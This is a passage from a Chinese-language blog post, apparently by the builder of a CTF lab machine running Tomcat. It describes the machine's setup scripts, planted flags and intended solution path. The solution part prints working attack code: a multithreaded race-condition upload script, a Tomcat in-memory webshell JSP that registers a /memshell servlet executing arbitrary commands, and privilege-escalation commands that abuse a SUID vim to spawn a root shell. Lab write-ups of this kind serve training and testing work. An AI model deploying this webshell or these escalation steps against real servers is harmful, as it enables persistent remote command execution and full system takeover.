+        if curl -s -o /dev/null -m 1 http://172.28.0.111:8080/; then
+            break
+        fi
+        sleep 1
+        i=$((i + 1))
+    done
+    if [ $i -eq 30 ]; then
+        ewend 1 "Tomcat did not respond in 30s"
+    fi
+
+    # 4. 确保 nginx 运行
+    if ! rc-service nginx status &gt;/dev/null 2&gt;&amp;1; then
+        rc-service nginx start
+    fi
+    nginx -t &amp;&amp; nginx -s reload
+
+    eend 0
+}
+
+stop() {
+    ebegin "Stopping MazeSec tomcat"
+
+    # 1. 停 cleaner
+    if [ -f "$CLEANER_PID" ]; then
+        local pid=$(cat "$CLEANER_PID")
+        if kill -0 "$pid" 2&gt;/dev/null; then
+            kill "$pid"
+            ewarn "cleaner stopped (pid $pid)"
+        fi
+        rm -f "$CLEANER_PID"
+    fi
+
+    # 2. 停容器
+    cd /opt/cat &amp;&amp; /usr/bin/docker compose down
+
+    eend 0
+}</code></pre>
+<pre><code class="language-bash">chmod +x /etc/init.d/maze-cat
+rc-update add maze-cat default</code></pre>
+<p>python版清洗器，每秒清洗uploads目录下的jsp文件，避免选手稳定控制，迫使通过条件竞争利用内存马获取稳定shell。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# cleaner.py - 兜底清洗 uploads 目录中的危险文件
+import os, time
+
+UPLOAD_DIR = "/opt/cat/uploads"
+SCAN_INTERVAL = 1  # 秒
+
+DANGEROUS_EXT = ('.jsp', '.jspx', '.jspf')
+
+def clean():
+    try:
+        for f in os.listdir(UPLOAD_DIR):
+            path = os.path.join(UPLOAD_DIR, f)
+            if not os.path.isfile(path):
+                continue
+            if any(f.lower().endswith(ext) for ext in DANGEROUS_EXT):
+                try:
+                    os.remove(path)
+                    print(f"[cleaner] removed {path}")
+                except FileNotFoundError:
+                    pass
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+if __name__ == "__main__":
+    print(f"[cleaner] watching {UPLOAD_DIR} every {SCAN_INTERVAL}s")
+    while True:
+        clean()
+        time.sleep(SCAN_INTERVAL)</code></pre>
+<h2>vim提权</h2>
+<p>准备了7个busybox的applet，授权了suid属性，作为烟雾弹，另外混入真实的单独二进制文件vim，授权了suid属性，作为提权工具。</p>
+<pre><code class="language-bash">root@Maze:/var/tmp# ls -alh
+total 10M
+drwxrwxrwt    2 root     root        4.0K Sep 27 13:24 .
+drwxr-xr-x   13 root     root        4.0K Jul 27 23:35 ..
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 cat
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 chmod
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 chown
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 grep
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 ln
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 mv
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 sh
+-rwsr-xr-x    1 root     root      785.8K Sep 27 13:12 tac
+-rwsr-sr-x    1 root     root      785.8K Sep 27 13:17 vi</code></pre>
+<p>真实提权</p>
+<pre><code class="language-bash">root@cat:/opt/cat# ls -alh /usr/bin/vi*
+lrwxrwxrwx    1 root     root          12 Jul 27 23:25 /usr/bin/vi -&gt; /bin/busybox
+-rwsr-sr-x    1 root     root        3.3M Sep 27 20:35 /usr/bin/vi 
+lrwxrwxrwx    1 root     root           3 Jul 27 23:44 /usr/bin/view -&gt; vim
+-rwxr-xr-x    1 root     root        3.3M Jul 25 08:56 /usr/bin/vim</code></pre>
+<h2>完整目录结构</h2>
+<pre><code class="language-plaintext">/opt/cat/
+├── docker-compose.yml
+├── Dockerfile
+├── id_ed25519              ← SSH 私钥（构建时 COPY 进容器）
+├── id_ed25519.pub
+├── cleaner.py
+├── conf/
+│   ├── server.xml
+│   ├── web.xml
+│   └── Catalina/
+│       └── localhost/
+│           └── ROOT.xml
+├── uploads/                ← 唯一可写 web 目录
+└── webapps/
+    └── ROOT/
+        └── index.jsp       ← 文件上传入口</code></pre>
+<h2>用户密码修改</h2>
+<pre><code class="language-bash">echo "root:mazesec2026" | chpasswd</code></pre>
+<h2>放置flag</h2>
+<pre><code class="language-bash">echo 'flag{root-26cfc55019b764229d2fe76c6300bdcf}' &gt; /root/root.txt
+echo 'flag{user-65b7e1c8e079c1e767f2a72db6e6d8bd}' &gt; /home/daochunhan/user.txt
+chown daochunhan:daochunhan /home/daochunhan/user.txt
+chmod 600 /home/daochunhan/user.txt</code></pre>
+<h2>压缩镜像</h2>
+<pre><code class="language-bash"># 用零填充空闲空间，便于压缩
+dd if=/dev/zero of=/zero bs=1M || true; rm -f /zero</code></pre>
+<h2>测试阶段</h2>
+<h2>条件竞争演示脚本</h2>
+<p>tomcat-memshell.sh，条件竞争验收脚本</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# race.py - 条件竞争触发 JSP 执行 → 注入内存马 → 验证 /memshell
+# 用法: python3 race.py &lt;url&gt; &lt;jsp_file&gt; [并发数] [窗口ms]
+
+import sys
+import os
+import time
+import threading
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# ---------- 参数 ----------
+if len(sys.argv) &lt; 3:
+    print(f"用法: {sys.argv[0]} &lt;url&gt; &lt;jsp_file&gt; [并发数] [窗口ms]")
+    sys.exit(1)
+
+URL       = sys.argv[1].rstrip("/") + "/"
+JSP       = sys.argv[2]
+PAIRS     = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 50
+WINDOW_MS = int(sys.argv[4]) if len(sys.argv) &gt; 4 else 0   # 仅用于打印提示
+
+if not os.path.isfile(JSP):
+    print(f"[-] 文件不存在: {JSP}")
+    sys.exit(1)
+
+JSP_NAME = os.path.basename(JSP)
+MEM_URL  = URL + "memshell"
+
+with open(JSP, "rb") as f:
+    JSP_DATA = f.read()
+
+# ---------- 全局状态 ----------
+hit_flag  = threading.Event()   # 命中标志
+hit_info  = {}                  # 命中信息
+lock      = threading.Lock()
+
+# ---------- 上传线程 ----------
+def uploader(name):
+    """无限循环 POST 上传，直到命中"""
+    headers = {
+        "Content-Type": "application/octet-stream",
+        "X-File-Name": name,
+    }
+    s = requests.Session()
+    while not hit_flag.is_set():
+        try:
+            s.post(URL, data=JSP_DATA, headers=headers,
+                   timeout=2, verify=False)
+        except Exception:
+            pass
+        # 不加 sleep，让服务端 sleep 拖住节奏
+
+# ---------- 读取线程 ----------
+def getter(name):
+    """无限循环 GET 上传文件，命中后验证 /memshell"""
+    target = f"{URL}uploads/{name}"
+    s = requests.Session()
+    while not hit_flag.is_set():
+        try:
+            r = s.get(target, timeout=1, verify=False)
+            if "Memory shell injected" in r.text:
+                # 原子占位
+                with lock:
+                    if hit_flag.is_set():
+                        return
+                    hit_flag.set()
+
+                # 等内存马注册稳定
+                time.sleep(0.5)
+                try:
+                    v = requests.get(f"{MEM_URL}?cmd=id",
+                                     timeout=3, verify=False)
+                    verify_text = v.text.strip()
+                except Exception as e:
+                    verify_text = f"&lt;验证失败: {e}&gt;"
+
+                hit_info["worker"]   = name
+                hit_info["target"]   = target
+                hit_info["response"] = r.text.strip()
+                hit_info["verify"]   = verify_text
+
+                print("[+] ========== HIT! ==========")
+                print(f"[+] Worker:    {name}")
+                print(f"[+] 触发 URL:  {target}")
+                print(f"[+] Response:  {r.text.strip()}")
+                print(f"[*] 验证 /memshell: {verify_text}")
+                print("[+] ===========================")
+                return
+        except Exception:
+            pass
+
+# ---------- 启动所有线程 ----------
+print(f"[*] URL:       {URL}")
+print(f"[*] Payload:   {JSP_NAME}")
+print(f"[*] 并发对:    {PAIRS}")
+if WINDOW_MS:
+    print(f"[*] 窗口:      {WINDOW_MS}ms")
+print()
+
+threads = []
+for i in range(1, PAIRS + 1):
+    name = f"r{i}_{JSP_NAME}"
+    t_up = threading.Thread(target=uploader, args=(name,), daemon=True)
+    t_ge = threading.Thread(target=getter,   args=(name,), daemon=True)
+    t_up.start()
+    t_ge.start()
+    threads.append(t_up)
+    threads.append(t_ge)
+
+# ---------- 主线程等待命中，最多 15 秒 ----------
+print("[*] 运行中，等待命中（最多 15 秒）...")
+deadline = time.time() + 15
+while time.time() &lt; deadline:
+    if hit_flag.is_set():
+        time.sleep(1)   # 给验证线程留时间
+        print("[+] 命中，退出。")
+        sys.exit(0)
+    time.sleep(0.1)
+
+print("[-] 超时未命中")
+sys.exit(1)</code></pre>
+<p>演示内存马</p>
+<pre><code class="language-jsp">&lt;%@ page import="java.io.*" %&gt;
+&lt;%@ page import="java.lang.reflect.*" %&gt;
+&lt;%@ page import="org.apache.catalina.core.*" %&gt;
+&lt;%@ page import="org.apache.catalina.Wrapper" %&gt;
+&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
+&lt;%!
+    public class ShellServlet extends HttpServlet {
+        @Override
+        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+            String cmd = req.getParameter("cmd");
+
+            // ===== 关键改动：无参数时默认执行 id =====
+            if (cmd == null || cmd.trim().isEmpty()) {
+                cmd = "id";
+            }
+
+            resp.setContentType("text/plain;charset=UTF-8");
+            try {
+                Process p = Runtime.getRuntime().exec(cmd);
+                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+                String line;
+                while ((line = br.readLine()) != null) {
+                    resp.getWriter().println(line);
+                }
+                while ((line = err.readLine()) != null) {
+                    resp.getWriter().println(line);
+                }
+                br.close();
+                err.close();
+                p.waitFor();
+            } catch (Exception e) {
+                resp.getWriter().write("Error: " + e.getMessage());
+            }
+        }
+
+        @Override
+        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+            doGet(req, resp);
+        }
+    }
+%&gt;
+&lt;%
+    try {
+        ServletContext servletContext = request.getServletContext();
+
+        Field applicationContextField = servletContext.getClass().getDeclaredField("context");
+        applicationContextField.setAccessible(true);
+        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+
+        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+        standardContextField.setAccessible(true);
+        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+
+        Wrapper wrapper = standardContext.createWrapper();
+        wrapper.setName("memshell");
+        wrapper.setServletClass(ShellServlet.class.getName());
+        wrapper.setServlet(new ShellServlet());
+        wrapper.setLoadOnStartup(1);
+
+        standardContext.addChild(wrapper);
+        standardContext.addServletMappingDecoded("/memshell", "memshell");
+
+        out.println("Memory shell injected: /memshell?cmd=");
+    } catch (Exception e) {
+        out.println("Failed: " + e.getMessage());
+    }
+%&gt;</code></pre>
+<h3>提权部分</h3>
+<p>核心思路：不经过busybox降权执行命令，或直接vi写文件</p>
+<pre><code class="language-bash">ls -alh /usr/bin/'vi '
+# 验证vi执行命令经过busybox降权
+/usr/bin/'vi ' -c ':!readlink /proc/$$/exe' -c ':q!'
+
+# 方案一：指定shell解释器，保留特权
+cat &gt; /tmp/a &lt;&lt; 'EOF'
+#!/bin/bash -p
+/bin/bash -p
+EOF
+chmod +x /tmp/a
+# 获取到euid 0的shell
+/usr/bin/'vi ' -c ':set shell=/tmp/a' -c ':!bash' -c ':q!'
+# 验证id -&gt; /bin/busybox经过降权
+id
+# 利用setpriv恢复完整权限shell
+setpriv --reuid 0 --regid 0 --clear-groups /bin/bash
+
+# 方案二：通过python不经过降权获取完整权限shell
+/usr/bin/'vi ' -c ":py3 import os,pty; os.setuid(0);os.setgid(0);pty.spawn('/bin/bash')" -c ':q!'</code></pre>
+<div style="text-align: center;">
+<video controls width="80%" style="height: auto;">
+  <source src="/images/maze-cat/cat.mp4" type="video/mp4">
+  你的浏览器不支持 video 标签
+</video>
+</div>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/0ofo/java-memshell">0ofo/java-memshell github</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#tomcat</span>
+                            </span>
+            </div>
+    </article>
+
+<section class="post-recommend" data-featured-recommend hidden aria-labelledby="featuredRecommendTitle">
+    <h2 class="post-recommend__title" id="featuredRecommendTitle">精选推荐</h2>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark_dimmed"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/random-recommend/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
